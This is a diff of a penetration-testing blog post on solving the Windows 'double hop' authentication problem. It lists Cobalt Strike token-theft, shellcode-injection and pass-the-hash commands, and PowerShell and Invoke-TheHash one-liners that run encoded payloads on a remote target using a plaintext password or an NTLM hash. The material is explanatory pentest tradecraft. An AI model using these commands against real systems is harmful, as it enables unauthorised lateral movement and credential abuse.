@@ -18,27 +18,14 @@ On a side note, if you have even wondered how the Mimikatz _sekurlsa::logonpassw
 
 You can solve the Double Hop problem by acquiring an access token for a logon session (impersonating) or injecting code into a process that contains the required access token. In Cobalt Strike this would be the commands:
 
-<!--kg-card-begin: html-->
-
     steal\_token [pid] inject [pid] \<x86|x64\> [listener] shinject [pid] \<x86|x64\> [/path/to/shellcode.bin] spawnu [pid] [listener]
-
-<!--kg-card-end: html-->
 
 If no logon sessions exist with the credential material you require, you can create one using the Cobalt Strike commands:
 
-<!--kg-card-begin: html-->
-
     make\_token [DOMAIN\user] [password] pth [DOMAIN\user] [HASH] spawnas [DOMAIN\user] [password] [listener]
-
-<!--kg-card-end: html-->
 
 Lastly you can directly pass the credentials to the tool performing the network operations like so:
 
-<!--kg-card-begin: html-->
-
     $pass = ConvertTo-SecureString 'Winter2019' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('DOMAIN\Account', $pass); Invoke-WmiMethod -Credential $cred -ComputerName "Target" win32\_process -name create -argumentlist 'powershell -ep bypass -noP -enc JABjACAAPQA...' Invoke-Command -Credential $cred -ComputerName "Target" -ScriptBlock {powershell -ep bypass -noP -enc JABjACAAPQA...} # https://github.com/Kevin-Robertson/Invoke-TheHash Invoke-SMBExec -Target Target -Domain DOMAIN -Username Account -Hash FFB91205A3D288362D86C529728B9DC0 -Command "powershell -ep bypass -noP -enc JABjACAAPQA..." -Verbose Invoke-WMIExec -Target Target -Domain DOMAIN -Username Account -Hash FFB91205A3D288362D86C529728B9DC0 -Command "powershell -ep bypass -noP -enc JABjACAAPQA..." -Verbose
 
-<!--kg-card-end: html-->
-
 Hopefully this gives you a better understanding of when you are allowed to authenticate to network resources during a penetration test.
-
